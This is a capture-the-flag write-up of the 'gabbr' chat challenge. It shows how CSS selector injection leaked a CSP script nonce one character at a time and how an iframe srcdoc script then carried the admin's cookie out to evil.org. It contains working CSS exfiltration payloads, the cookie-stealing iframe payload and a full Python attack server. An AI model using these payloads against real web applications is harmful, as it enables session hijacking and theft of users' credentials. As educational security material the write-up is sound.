Tasteless 2019 - Gabbr

Source: https://w0y.at/writeup/2019/10/27/tasteless-2019-gabbr.html

CSP, CSS

Overview
--------

gabbr is an online chatroom service. Upon loading the page, one joins a
chatroom specified in the anchor part of the URL e.g.
`https://gabbr.hitme.tasteless.eu/#8f332afe-8f1d-411f-80f3-44bb2302405d`.
If no name is specified, a random UUID is generated upon join. The main
functionality is to send messages in the chatroom. Furthermore, one can
change the username to another randomly generated one, join a new random
chatroom and report the chatroom to an admin. Upon reporting an admin
joins the chat and stays in the room for 15s. Additionally, the chatroom
is based on websockets.

Exploitation
------------

### Gathering intelligence (like the NSA 😎)

Messages are not sanitized, i.e. arbitrary HTML can be injected.
However, the CSP policy is rather restrictive:
```
    default-src 'self'; script-src 'nonce-cff855cb552d6be6be760496'; frame-src https://www.google.com/recaptcha/; connect-src 'self' xsstest.tasteless.eu https://www.google.com/recaptcha/; worker-src https://www.google.com/recaptcha/; style-src 'unsafe-inline' https://www.gstatic.com/recaptcha/; font-src 'self'; img-src *; report-uri https://xsstest.ctf.tasteless.eu/report-violation; object-src 'none'
```
Script tags are only executed if the have the correct `nonce` as an
attribute. The nonce is generated server-side on every page load and is
specified in the CSP as `script-src 'nonce-cff855cb552d6be6be760496';`.
This blocks any other attempts and tricks to execute JavaScript like
event handlers. So, to execute JavaScript, one needs to know the 24
characters long `nonce` of the loaded page which we obviously cannot
trivially obtain from the admin. What we *can* do, though, is to load
arbitrary CSS and images---`style-src` is set to `unsafe-inline` and
`img-src` to `*` which allows for interesting attacks.

### Getting the nonce

After searching on the web for ideas we stumbled upon this article from
2016:
https://sirdarckcat.blogspot.com/2016/12/how-to-bypass-csp-nonces-with-dom-xss.html
The author describes an attack where one can extract the by using CSS:

-   Firstly, one injects a CSS selector which matches the first
    character of the nonce.
-   Upon matching, the CSS selector is set to load a background image
    from a given URL. Since we know what was matched we can add the
    matching characters to the request as GET parameters.
-   By repeating this process for every character, we can reconstruct
    the whole nonce with 24 messages.

This fits perfectly since we can inject arbitrary CSS! Therefore, like
proper hackers, we copied his scripts. However, the given selectors did
not work. Therefore, we began debugging the selectors on our own. After
fruitless attempts trying to match the `script` tag using Chrome we
noticed something peculiar: Chrome removes the `nonce` from the
`script`-tag after it has been loaded. However, Firefox happily keeps
the `nonce` in the DOM. Luckily, the attacker uses Firefox as we found
out from the admin\'s user-agent header.

Our first approach was to match the `script` tag directly:
`script[nonce^="a"]`. This should match any `script`-tag with a nonce
that starts with `a`. However, this didn\'t work as expected. After lots
of trial and error we figured out that you can\'t directly match a
`script`-tag, but you can use it as part of the selector when selecting
other elements. Therefore, we decided to use a sibling selector like
this: `script[nonce^="%s"] ~ nav`. Since `nav` is a sibling of the
`script`-tag this worked perfectly.

Using the above method we can send a message like this:
```
    script[nonce^="0"] ~ nav {background:url("http://evil.org/?match=0")}
    script[nonce^="1"] ~ nav {background:url("http://evil.org/?match=1")}
    ...
    script[nonce^="f"] ~ nav {background:url("http://evil.org/?match=f")}
```
which triggers only if at least one element matches the selector (and as
such, only the \"correct\" request is executed). Suppose the first
character is `a`, then our next payload is as follows:
```
    script[nonce^="a0"] ~ nav {background:url("http://evil.org/?match=a0")}
    script[nonce^="a1"] ~ nav {background:url("http://evil.org/?match=a1")}
    ...
    script[nonce^="af"] ~ nav {background:url("http://evil.org/?match=af")}
```
We can repeat this procedure 24 times to exfiltrate the whole nonce.

We implemented an attack server in python which receives the successful
request and sends another message to the chatroom querying the next
character as described above. The next payload is sent to the chatroom
directly by connecting to the websocket of the chatroom.

However, upon trying it out we noticed that only the first request was
being sent. This is because subsequent CSS injections have the same
specificity as the previous CSS rules, that means that the background
fetching isn\'t executed a second time. We solved this problem by
manually curating a set of 24 selectors from least to most important:
```
    script[nonce^="%s"] ~ *
    script[nonce^="%s"] ~ ul
    script[nonce^="%s"] ~ div
    script[nonce^="%s"] ~ input
    script[nonce^="%s"] ~ nav
    body > script[nonce^="%s"] ~ ul
    body > script[nonce^="%s"] ~ div
    body > script[nonce^="%s"] ~ input
    body > script[nonce^="%s"] ~ nav
    script[nonce^="%s"] ~ #messages
    script[nonce^="%s"] ~ #status
    script[nonce^="%s"] ~ #chatbox
    script[nonce^="%s"] ~ #recaptcha
    script[nonce^="%s"] ~ nav > a
    script[nonce^="%s"] ~ nav > #report-link
    script[nonce^="%s"] ~ nav > #username
    body script[nonce^="%s"] ~ #messages
    body script[nonce^="%s"] ~ #status
    body script[nonce^="%s"] ~ #chatbox
    body script[nonce^="%s"] ~ #recaptcha
    body script[nonce^="%s"] ~ nav > a
    body script[nonce^="%s"] ~ nav > #report-link
    body script[nonce^="%s"] ~ nav > #username
    body script[nonce^="%s"] ~ nav > [href="/"]
    body script[nonce^="%s"] ~ nav > [href="#"]
```
Putting it all together we managed to get the complete nonce!

### Creating an exploit

Now that we have the nonce we can inject `script`-tags which bypass the
CSP and will be executed. However, directly ínjecting
`<script nonce="...">alert(1);</script>` does not have any effect
because the script isn\'t being evaluated after the page has loaded.
Therefore, to bypass this restriction we include the script inside an
`iframe` by specifying it as the `srcdoc`. Our final exploit looks like
this:
```
    <iframe srcdoc="<script nonce=...>alert(document.cookie); var x = document.createElement('img'); x.src = 'http://evil.org/res?c=' + document.cookie;</script>"></iframe>
```
Notice that we are trying to load an image rather than sending a request
directly because the latter is blocked by the CSP. Luckily, the CSP
allows loading images from any origin.

### Putting it all together

Our final approach was the following:

1.  Enter a chatroom using Chrome so that we are unaffected by the
    exploit
2.  Start the exploit server pointed at the chatroom
3.  Report the chatroom and wait for the admin to join
4.  Send the initial CSS payload manually through the browser.
5.  Let the server handle the rest
    1.  Wait for an http request from the admin
    2.  Parse the GET parameter
    3.  Send the next CSS payload via websockets to exfiltrate the next
        4haracter
    4.  Repeat until we have the whole nonce
    5.  Send the exploit `iframe`
    6.  Listen for the request from the admin containing the cookies
        containing the flag
    7.  ????
    8.  PROFIT!!!!

Below is the final script that ran on the server:
```python
    from flask import Flask, request
    import sys
    import json
    import websocket
    import string

    app = Flask(__name__)
    URL = "http://evil.org:5000"

    payloads = [
            'script[nonce^="%s"] ~ *',
            'script[nonce^="%s"] ~ ul',
            'script[nonce^="%s"] ~ div',
            'script[nonce^="%s"] ~ input',
            'script[nonce^="%s"] ~ nav',
            'body > script[nonce^="%s"] ~ ul',
            'body > script[nonce^="%s"] ~ div',
            'body > script[nonce^="%s"] ~ input',
            'body > script[nonce^="%s"] ~ nav',
            'script[nonce^="%s"] ~ #messages',
            'script[nonce^="%s"] ~ #status',
            'script[nonce^="%s"] ~ #chatbox',
            'script[nonce^="%s"] ~ #recaptcha',
            'script[nonce^="%s"] ~ nav > a',
            'script[nonce^="%s"] ~ nav > #report-link',
            'script[nonce^="%s"] ~ nav > #username',
            'body script[nonce^="%s"] ~ #messages',
            'body script[nonce^="%s"] ~ #status',
            'body script[nonce^="%s"] ~ #chatbox',
            'body script[nonce^="%s"] ~ #recaptcha',
            'body script[nonce^="%s"] ~ nav > a',
            'body script[nonce^="%s"] ~ nav > #report-link',
            'body script[nonce^="%s"] ~ nav > #username',
            'body script[nonce^="%s"] ~ nav > [href="/"]',
            'body script[nonce^="%s"] ~ nav > [href="#"]',
            ]

    def exploit(nonce, url):
        x = """<iframe srcdoc="<script nonce=%s>alert(document.cookie); var x = document.createElement('img'); x.src = '%s/res?c=' + document.cookie;</script>"></iframe>""" % (nonce, url)
        msg = {"username" : "aaa", "type": "gabbr-message", "content": x}
        print(json.dumps(msg))
        socket.send(json.dumps(msg))

    def generate_style(c, url):
        style = "<style>"
        for x in "abcdef" + string.digits:
            style = style + ((payloads[len(c)] + '{ background:url("%s/?match=%s") } ') % (c + x, url, c + x))
        style = style + "</style>"
        return style

    @app.route('/')
    def handler():
        match = request.args.get('match')
        print(match)
        if len(match) == 24:
            exploit(match, URL)
        else:
            send_req(match)
        return "a"

    @app.route('/res')
    def res():
        match = request.args.get('c')
        print(match)
        return "a"


    def send_req(match):
        msg = {"username" : "aaa", "type": "gabbr-message", "content": generate_style(match, URL)}
        socket.send(json.dumps(msg))

    if __name__ == '__main__':
        uri = "wss://gabbr.hitme.tasteless.eu/" + sys.argv[1]
        socket = websocket.WebSocket()
        socket.connect(uri)
        print(generate_style("", URL)) # This outputs the initial payload, we did it manually to avoid certain concurrency issues
        app.run(host="0.0.0.0")
```
